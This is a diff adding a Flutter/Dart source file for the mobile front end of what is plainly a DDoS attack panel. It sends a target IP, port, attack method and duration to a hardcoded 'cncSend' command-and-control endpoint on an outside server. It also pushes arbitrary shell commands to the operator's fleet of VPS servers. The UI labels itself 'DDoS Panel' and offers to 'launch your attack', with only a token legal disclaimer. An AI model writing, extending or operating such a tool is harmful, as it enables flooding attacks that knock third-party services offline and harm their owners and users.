@@ -1,0 +1,927 @@
+import 'package:flutter/material.dart';
+import 'package:http/http.dart' as http;
+import 'dart:convert';
+import 'manage_server.dart'; // Impor halaman baru
+import 'package:font_awesome_flutter/font_awesome_flutter.dart';
+
+class AttackPanel extends StatefulWidget {
+  final String sessionKey;
+  final List<Map<String, dynamic>> listDDoS;
+
+  const AttackPanel({
+    super.key,
+    required this.sessionKey,
+    required this.listDDoS,
+  });
+
+  @override
+  State<AttackPanel> createState() => _AttackPanelState();
+}
+
+class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
+  // Controllers
+  final targetController = TextEditingController();
+  final portController = TextEditingController();
+  final commandController = TextEditingController();
+
+  // Constants - Perbaikan URL agar sesuai dengan endpoint backend
+  static const String baseUrl = "https://ppl.nullxteam.fun/api/vps";
+  static const Color primaryColor = Color(0xFF4ADE80); // Hijau muda
+  static const Color secondaryColor = Color(0xFF1A1A1A);
+  static const Color accentColor = Color(0xFF2ECC71); // Hijau terang lebih terang
+
+  // State variables
+  late AnimationController _controller;
+  late AnimationController _fadeController;
+  late AnimationController _glowController;
+  late AnimationController _slideController;
+  late Animation<double> _fadeAnimation;
+  late Animation<double> _glowAnimation;
+  late Animation<Offset> _slideAnimation;
+  String selectedDoosId = "";
+  double attackDuration = 60;
+  bool isExecuting = false;
+  bool isCommandExecuting = false;
+  bool _isSpeedDialOpen = false;
+
+  @override
+  void initState() {
+    super.initState();
+    _initializeAnimations();
+    _setDefaultDoos();
+  }
+
+  void _initializeAnimations() {
+    _controller = AnimationController(
+      vsync: this,
+      duration: const Duration(seconds: 2),
+    );
+
+    _fadeController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 800),
+    );
+
+    _glowController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 2000),
+    )..repeat(reverse: true);
+
+    _slideController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 1000),
+    );
+
+    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
+      CurvedAnimation(parent: _fadeController, curve: Curves.easeIn),
+    );
+
+    _glowAnimation = Tween<double>(begin: 0.5, end: 1.0).animate(
+      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
+    );
+
+    _slideAnimation = Tween<Offset>(
+      begin: const Offset(0, 0.3),
+      end: Offset.zero,
+    ).animate(CurvedAnimation(parent: _slideController, curve: Curves.easeOut));
+
+    _fadeController.forward();
+    Future.delayed(const Duration(milliseconds: 200), () {
+      _slideController.forward();
+    });
+  }
+
+  void _setDefaultDoos() {
+    if (widget.listDDoS.isNotEmpty) {
+      selectedDoosId = widget.listDDoS[0]['ddos_id'];
+    }
+  }
+
+  void _toggleSpeedDial() {
+    setState(() {
+      _isSpeedDialOpen = !_isSpeedDialOpen;
+    });
+  }
+
+  Future<void> _sendDoos() async {
+    if (isExecuting) return;
+
+    setState(() => isExecuting = true);
+
+    final target = targetController.text.trim();
+    final port = portController.text.trim();
+    final key = widget.sessionKey;
+    final int duration = attackDuration.toInt();
+
+    if (!_validateInputs(target, port)) {
+      setState(() => isExecuting = false);
+      return;
+    }
+
+    try {
+      final uri = Uri.parse(
+          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
+      final res = await http.get(uri);
+      final data = jsonDecode(res.body);
+
+      _handleResponse(data, target);
+    } catch (_) {
+      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
+    } finally {
+      setState(() => isExecuting = false);
+    }
+  }
+
+  Future<void> _sendCommand() async {
+    if (isCommandExecuting) return;
+
+    final command = commandController.text.trim();
+    if (command.isEmpty) {
+      _showAlert("❌ Error", "Command cannot be empty.");
+      return;
+    }
+
+    setState(() => isCommandExecuting = true);
+
+    try {
+      final uri = Uri.parse("$baseUrl/sendCommand");
+      final res = await http.post(
+        uri,
+        headers: {"Content-Type": "application/json"},
+        body: jsonEncode({
+          "key": widget.sessionKey,
+          "command": command,
+        }),
+      );
+      final data = jsonDecode(res.body);
+
+      if (data["success"] == true) {
+        // Tutup dialog command terlebih dahulu
+        Navigator.pop(context);
+
+        // Tampilkan notifikasi popup (snackbar) bahwa command telah terkirim
+        _showCommandNotification("Command sent successfully!");
+
+        // Tampilkan alert dengan detail
+        _showAlert("✅ Success", "Command has been successfully sent to all your VPS servers.");
+      } else {
+        _showAlert("❌ Failed", data["error"] ?? "Failed to send command.");
+      }
+    } catch (_) {
+      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
+    } finally {
+      setState(() => isCommandExecuting = false);
+    }
+  }
+
+  // Metode baru untuk menampilkan notifikasi popup
+  void _showCommandNotification(String message) {
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Row(
+          children: [
+            const Icon(Icons.check_circle, color: Colors.white),
+            const SizedBox(width: 8),
+            Expanded(
+              child: Text(
+                message,
+                style: const TextStyle(color: Colors.white),
+              ),
+            ),
+          ],
+        ),
+        backgroundColor: const Color(0xFF4ADE80),
+        duration: const Duration(seconds: 3),
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(8),
+        ),
+        margin: const EdgeInsets.all(16),
+      ),
+    );
+  }
+
+  bool _validateInputs(String target, String port) {
+    if (target.isEmpty || widget.sessionKey.isEmpty) {
+      _showAlert("❌ Invalid Input", "Target IP cannot be empty.");
+      return false;
+    }
+
+    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
+    if (!isIcmp && (port.isEmpty || int.tryParse(port) == null)) {
+      _showAlert("❌ Invalid Port", "Please input a valid port.");
+      return false;
+    }
+
+    return true;
+  }
+
+  void _handleResponse(Map<String, dynamic> data, String target) {
+    if (data["success"] == true) {
+      _showAlert("✅ Success", "Attack has been successfully sent to $target.");
+    } else if (data["error"] != null) {
+      _showAlert("❌ Error", data["error"]);
+    } else {
+      _showAlert("⚠️ Unknown", "Unknown response from server.");
+    }
+  }
+
+  void _showAlert(String title, String msg) {
+    showDialog(
+      context: context,
+      builder: (_) => AlertDialog(
+        backgroundColor: secondaryColor,
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(12),
+          side: BorderSide(color: primaryColor.withOpacity(0.2), width: 1),
+        ),
+        title: Text(title, style: const TextStyle(color: primaryColor, fontFamily: 'Orbitron')),
+        content: Text(msg, style: const TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono')),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.pop(context),
+            child: const Text("OK", style: TextStyle(color: primaryColor)),
+          )
+        ],
+      ),
+    );
+  }
+
+  void _showCommandDialog() {
+    _toggleSpeedDial(); // Close speed dial first
+    showDialog(
+      context: context,
+      barrierDismissible: false, // Mencegah dialog tertutup saat menunggu respons
+      builder: (_) => AlertDialog(
+        backgroundColor: secondaryColor,
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(12),
+          side: BorderSide(color: primaryColor.withOpacity(0.2), width: 1),
+        ),
+        title: const Text("Send Command", style: TextStyle(color: primaryColor, fontFamily: 'Orbitron')),
+        content: Column(
+          mainAxisSize: MainAxisSize.min,
+          children: [
+            const Text(
+              "Enter a command to execute on all your VPS servers:",
+              style: TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono'),
+            ),
+            const SizedBox(height: 16),
+            TextField(
+              controller: commandController,
+              style: const TextStyle(color: primaryColor),
+              cursorColor: primaryColor,
+              maxLines: 3,
+              decoration: _inputStyle("e.g. apt update && apt upgrade -y"),
+            ),
+          ],
+        ),
+        actions: [
+          TextButton(
+            onPressed: isCommandExecuting ? null : () => Navigator.pop(context),
+            child: const Text("Cancel", style: TextStyle(color: primaryColor)),
+          ),
+          ElevatedButton(
+            onPressed: isCommandExecuting ? null : _sendCommand,
+            style: ElevatedButton.styleFrom(
+              backgroundColor: primaryColor,
+              foregroundColor: Colors.black,
+            ),
+            child: isCommandExecuting
+                ? const SizedBox(
+              width: 20,
+              height: 20,
+              child: CircularProgressIndicator(
+                strokeWidth: 2,
+                valueColor: AlwaysStoppedAnimation<Color>(Colors.black),
+              ),
+            )
+                : const Text("Send"),
+          ),
+        ],
+      ),
+    );
+  }
+
+  void _navigateToManageServer() {
+    _toggleSpeedDial(); // Close speed dial first
+    Navigator.push(
+      context,
+      MaterialPageRoute(
+        builder: (context) => ManageServerPage(sessionKey: widget.sessionKey),
+      ),
+    );
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
+
+    return Scaffold(
+      backgroundColor: Colors.black,
+      // Use Stack to place the speed dial and a backdrop
+      body: Stack(
+        children: [
+          // Animated background
+          _buildAnimatedBackground(),
+
+          // Gradient overlay
+          Container(
+            decoration: BoxDecoration(
+              gradient: LinearGradient(
+                colors: [
+                  Colors.black.withOpacity(0.7),
+                  Colors.black.withOpacity(0.85),
+                  Colors.black,
+                ],
+                begin: Alignment.topCenter,
+                end: Alignment.bottomCenter,
+              ),
+            ),
+          ),
+
+          // Main content
+          SafeArea(
+            child: SingleChildScrollView(
+              physics: const BouncingScrollPhysics(),
+              child: Padding(
+                padding: const EdgeInsets.all(16.0),
+                child: FadeTransition(
+                  opacity: _fadeAnimation,
+                  child: SlideTransition(
+                    position: _slideAnimation,
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        _buildHeader(),
+                        const SizedBox(height: 20),
+                        _buildTargetSection(isIcmp),
+                        const SizedBox(height: 20),
+                        _buildAttackSection(),
+                        const SizedBox(height: 20),
+                        _buildExecuteButton(),
+                        const SizedBox(height: 12),
+                        _buildDisclaimer(),
+                      ],
+                    ),
+                  ),
+                ),
+              ),
+            ),
+          ),
+
+          // Backdrop to close the speed dial on tap
+          if (_isSpeedDialOpen)
+            Positioned.fill(
+              child: GestureDetector(
+                onTap: _toggleSpeedDial,
+                child: Container(color: Colors.black.withOpacity(0.3)),
+              ),
+            ),
+          // Speed Dial
+          Positioned(
+            top: 80, // Adjust top position as needed
+            right: 16,
+            child: _buildSpeedDial(),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildAnimatedBackground() {
+    return Container(
+      decoration: const BoxDecoration(
+        gradient: LinearGradient(
+          colors: [
+            Color(0xFF0A0A0A),
+            Color(0xFF121212),
+            Color(0xFF1A1A1A),
+          ],
+          begin: Alignment.topLeft,
+          end: Alignment.bottomRight,
+        ),
+      ),
+      child: Stack(
+        children: [
+          // Animated particles with green theme
+          ...List.generate(15, (index) {
+            final size = (index % 5 + 1) * 2.0;
+            final opacity = (index % 5 + 1) / 10.0;
+            return AnimatedBuilder(
+              animation: _glowController,
+              builder: (context, child) {
+                return Positioned(
+                  left: (index * 73.0) % MediaQuery.of(context).size.width,
+                  top: (index * 137.0) % MediaQuery.of(context).size.height,
+                  child: Container(
+                    width: size,
+                    height: size,
+                    decoration: BoxDecoration(
+                      color: const Color(0xFF4ADE80).withOpacity(opacity * _glowAnimation.value),
+                      shape: BoxShape.circle,
+                    ),
+                  ),
+                );
+              },
+            );
+          }),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildSpeedDial() {
+    return Column(
+      mainAxisSize: MainAxisSize.min,
+      crossAxisAlignment: CrossAxisAlignment.end,
+      children: [
+        // Manage Server Button
+        AnimatedBuilder(
+          animation: _glowController,
+          builder: (context, child) {
+            return Transform.scale(
+              scale: 1.0 + (0.1 * _glowAnimation.value),
+              child: _buildSpeedDialChild(
+                icon: Icons.dns,
+                label: "Manage Server",
+                onTap: _navigateToManageServer,
+              ),
+            );
+          },
+        ),
+        const SizedBox(height: 12),
+        // Send Command Button
+        AnimatedBuilder(
+          animation: _glowController,
+          builder: (context, child) {
+            return Transform.scale(
+              scale: 1.0 + (0.1 * _glowAnimation.value),
+              child: _buildSpeedDialChild(
+                icon: Icons.terminal,
+                label: "Send Command",
+                onTap: _showCommandDialog,
+              ),
+            );
+          },
+        ),
+        const SizedBox(height: 12),
+        // Main FAB
+        AnimatedBuilder(
+          animation: _glowController,
+          builder: (context, child) {
+            return Transform.scale(
+              scale: 1.0 + (0.1 * _glowAnimation.value),
+              child: FloatingActionButton(
+                onPressed: _toggleSpeedDial,
+                backgroundColor: primaryColor,
+                child: const Icon(Icons.add, color: Colors.black),
+              ),
+            );
+          },
+        ),
+      ],
+    );
+  }
+
+  Widget _buildSpeedDialChild({
+    required IconData icon,
+    required String label,
+    required VoidCallback onTap,
+  }) {
+    return AnimatedOpacity(
+      opacity: _isSpeedDialOpen ? 1.0 : 0.0,
+      duration: const Duration(milliseconds: 200),
+      child: FloatingActionButton.extended(
+        onPressed: onTap,
+        icon: Icon(icon, color: Colors.black, size: 20),
+        label: Text(
+          label,
+          style: const TextStyle(color: Colors.black, fontSize: 12),
+        ),
+        backgroundColor: primaryColor,
+        heroTag: null, // Important to avoid tag conflicts
+      ),
+    );
+  }
+
+  Widget _buildHeader() {
+    return Container(
+      width: double.infinity,
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: secondaryColor,
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: primaryColor.withOpacity(0.1)),
+        boxShadow: [
+          BoxShadow(
+            color: primaryColor.withOpacity(0.1),
+            blurRadius: 10,
+            spreadRadius: 2,
+          ),
+        ],
+      ),
+      child: Column(
+        children: [
+          AnimatedBuilder(
+            animation: _glowController,
+            builder: (context, child) {
+              return Container(
+                padding: const EdgeInsets.all(12),
+                decoration: BoxDecoration(
+                  color: primaryColor.withOpacity(0.1),
+                  shape: BoxShape.circle,
+                  border: Border.all(
+                    color: primaryColor.withOpacity(0.3 * _glowAnimation.value),
+                    width: 2,
+                  ),
+                  boxShadow: [
+                    BoxShadow(
+                      color: primaryColor.withOpacity(0.2 * _glowAnimation.value),
+                      blurRadius: 10,
+                      spreadRadius: 2,
+                    ),
+                  ],
+                ),
+                child: const Icon(
+                  Icons.security,
+                  size: 40,
+                  color: primaryColor,
+                ),
+              );
+            },
+          ),
+          const SizedBox(height: 12),
+          const Text(
+            "DDoS Panel",
+            style: TextStyle(
+              color: primaryColor,
+              fontFamily: 'Orbitron',
+              fontSize: 22,
+              fontWeight: FontWeight.bold,
+            ),
+          ),
+          const SizedBox(height: 6),
+          Text(
+            "Configure and launch your attack",
+            style: TextStyle(
+              color: primaryColor.withOpacity(0.7),
+              fontFamily: 'ShareTechMono',
+              fontSize: 13,
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildTargetSection(bool isIcmp) {
+    return Container(
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: Colors.white.withOpacity(0.05),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: primaryColor.withOpacity(0.1)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          _buildSectionTitle("Target Configuration"),
+          const SizedBox(height: 12),
+          _buildInputCard(
+            icon: Icons.dns,
+            title: "Target IP",
+            child: TextField(
+              controller: targetController,
+              style: const TextStyle(color: primaryColor),
+              cursorColor: primaryColor,
+              decoration: _inputStyle("Enter target IP address (e.g. 1.1.1.1)"),
+            ),
+          ),
+          const SizedBox(height: 12),
+          _buildInputCard(
+            icon: Icons.settings_ethernet,
+            title: "Port",
+            child: TextField(
+              controller: portController,
+              enabled: !isIcmp,
+              keyboardType: TextInputType.number,
+              style: TextStyle(color: isIcmp ? Colors.grey : primaryColor),
+              decoration: _inputStyle(
+                isIcmp ? "ICMP protocol does not use ports" : "Enter port number (e.g. 80)",
+                isIcmp: isIcmp,
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildAttackSection() {
+    return Container(
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: Colors.white.withOpacity(0.05),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: primaryColor.withOpacity(0.1)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          _buildSectionTitle("Attack Configuration"),
+          const SizedBox(height: 12),
+          _buildDurationCard(),
+          const SizedBox(height: 12),
+          _buildMethodCard(),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildDurationCard() {
+    return Container(
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: Colors.white.withOpacity(0.05),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: primaryColor.withOpacity(0.1)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            mainAxisAlignment: MainAxisAlignment.spaceBetween,
+            children: [
+              Text(
+                "⏱ ${attackDuration.toInt()} seconds",
+                style: const TextStyle(color: primaryColor, fontSize: 16),
+              ),
+              Text(
+                "${(attackDuration / 60).toStringAsFixed(1)} min",
+                style: TextStyle(color: primaryColor.withOpacity(0.5), fontSize: 12),
+              ),
+            ],
+          ),
+          const SizedBox(height: 8),
+          SliderTheme(
+            data: SliderTheme.of(context).copyWith(
+              activeTrackColor: primaryColor,
+              inactiveTrackColor: primaryColor.withOpacity(0.2),
+              thumbColor: accentColor,
+              overlayColor: accentColor.withOpacity(0.1),
+              thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 8),
+              trackHeight: 4,
+            ),
+            child: Slider(
+              value: attackDuration,
+              min: 10,
+              max: 300,
+              divisions: 29,
+              onChanged: (value) {
+                setState(() => attackDuration = value);
+              },
+            ),
+          ),
+          Row(
+            mainAxisAlignment: MainAxisAlignment.spaceBetween,
+            children: [
+              Text(
+                "10s",
+                style: TextStyle(color: primaryColor.withOpacity(0.5), fontSize: 12),
+              ),
+              Text(
+                "5min",
+                style: TextStyle(color: primaryColor.withOpacity(0.5), fontSize: 12),
+              ),
+            ],
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildMethodCard() {
+    return Container(
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: Colors.white.withOpacity(0.05),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: primaryColor.withOpacity(0.1)),
+      ),
+      child: DropdownButtonHideUnderline(
+        child: DropdownButton<String>(
+          dropdownColor: secondaryColor,
+          value: selectedDoosId,
+          isExpanded: true,
+          iconEnabledColor: primaryColor,
+          style: const TextStyle(color: primaryColor),
+          items: widget.listDDoS.map((doos) {
+            return DropdownMenuItem<String>(
+                value: doos['ddos_id'],
+                child: Container(
+                  padding: const EdgeInsets.symmetric(vertical: 8),
+                  child: Row(
+                    children: [
+                      Container(
+                        padding: const EdgeInsets.all(8),
+                        decoration: BoxDecoration(
+                          color: primaryColor.withOpacity(0.1),
+                          borderRadius: BorderRadius.circular(6),
+                        ),
+                        child: const Icon(
+                          Icons.flash_on,
+                          color: primaryColor,
+                          size: 16,
+                        ),
+                      ),
+                      const SizedBox(width: 10),
+                      Expanded(
+                        child: Text(
+                          doos['ddos_name'],
+                          style: const TextStyle(color: primaryColor),
+                        ),
+                      ),
+                    ],
+                  ),
+                ));
+            }).toList(),
+          onChanged: (value) {
+            setState(() {
+              selectedDoosId = value!;
+            });
+          },
+        ),
+      ),
+    );
+  }
+
+  Widget _buildExecuteButton() {
+    return AnimatedBuilder(
+      animation: _glowController,
+      builder: (context, child) {
+        return Transform.scale(
+          scale: 1.0 + (0.05 * _glowAnimation.value),
+          child: SizedBox(
+            width: double.infinity,
+            height: 56,
+            child: ElevatedButton.icon(
+              icon: isExecuting
+                  ? SizedBox(
+                width: 20,
+                height: 20,
+                child: CircularProgressIndicator(
+                  strokeWidth: 2,
+                  valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
+                ),
+              )
+                  : const Icon(Icons.play_arrow, color: Colors.white, size: 18),
+              label: Text(
+                isExecuting ? "EXECUTING..." : "EXECUTE",
+                style: const TextStyle(
+                  fontSize: 16,
+                  fontFamily: 'Orbitron',
+                  fontWeight: FontWeight.bold,
+                  letterSpacing: 2,
+                  color: Colors.white,
+                ),
+              ),
+              style: ElevatedButton.styleFrom(
+                backgroundColor: primaryColor,
+                foregroundColor: Colors.white,
+                padding: const EdgeInsets.symmetric(vertical: 14),
+                shape: RoundedRectangleBorder(
+                  borderRadius: BorderRadius.circular(14),
+                ),
+              ),
+              onPressed: isExecuting ? null : _sendDoos,
+            ),
+          ),
+        );
+      },
+    );
+  }
+
+  Widget _buildDisclaimer() {
+    return Container(
+      padding: const EdgeInsets.all(12),
+      decoration: BoxDecoration(
+        color: Colors.white.withOpacity(0.05),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: primaryColor.withOpacity(0.1)),
+      ),
+      child: Row(
+        children: [
+          Icon(
+            FontAwesomeIcons.exclamationTriangle,
+            color: primaryColor.withOpacity(0.7),
+            size: 14,
+          ),
+          const SizedBox(width: 10),
+          Expanded(
+            child: Text(
+              "Use responsibly and in accordance with applicable laws",
+              style: TextStyle(
+                color: primaryColor.withOpacity(0.7),
+                fontSize: 11,
+                fontFamily: 'ShareTechMono',
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildSectionTitle(String title) {
+    return Padding(
+      padding: const EdgeInsets.only(left: 4),
+      child: Text(
+        title.toUpperCase(),
+        style: TextStyle(
+          color: primaryColor.withOpacity(0.7),
+          fontFamily: 'Orbitron',
+          fontSize: 13,
+          fontWeight: FontWeight.bold,
+          letterSpacing: 1,
+        ),
+      ),
+    );
+  }
+
+  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
+    return Container(
+      padding: const EdgeInsets.all(14),
+      decoration: BoxDecoration(
+        color: Colors.white.withOpacity(0.05),
+        borderRadius: BorderRadius.circular(8),
+        border: Border.all(color: primaryColor.withOpacity(0.1)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            children: [
+              Container(
+                padding: const EdgeInsets.all(8),
+                decoration: BoxDecoration(
+                  color: primaryColor.withOpacity(0.1),
+                  borderRadius: BorderRadius.circular(6),
+                ),
+                child: Icon(icon, color: primaryColor, size: 18),
+              ),
+              const SizedBox(width: 10),
+              Text(
+                title,
+                style: const TextStyle(
+                  color: primaryColor,
+                  fontWeight: FontWeight.bold,
+                  fontFamily: 'Orbitron',
+                  fontSize: 14,
+                ),
+              ),
+            ],
+          ),
+          const SizedBox(height: 10),
+          child,
+        ],
+      ),
+    );
+  }
+
+  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
+    return InputDecoration(
+      hintText: hint,
+      hintStyle: TextStyle(
+        color: isIcmp ? Colors.grey : primaryColor.withOpacity(0.5),
+        fontFamily: 'ShareTechMono',
+        fontSize: 14,
+      ),
+      filled: true,
+      fillColor: Colors.black.withOpacity(0.3),
+      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
+      enabledBorder: OutlineInputBorder(
+        borderSide: BorderSide(
+          color: isIcmp ? Colors.grey : primaryColor.withOpacity(0.1),
+        ),
+        borderRadius: BorderRadius.circular(6),
+      ),
+      focusedBorder: OutlineInputBorder(
+        borderSide: BorderSide(color: accentColor.withOpacity(0.5)),
+        borderRadius: BorderRadius.circular(6),
+      ),
+    );
+  }
+
+  @override
+  void dispose() {
+    _controller.dispose();
+    _fadeController.dispose();
+    _glowController.dispose();
+    _slideController.dispose();
+    targetController.dispose();
+    portController.dispose();
+    commandController.dispose();
+    super.dispose();
+  }
+}
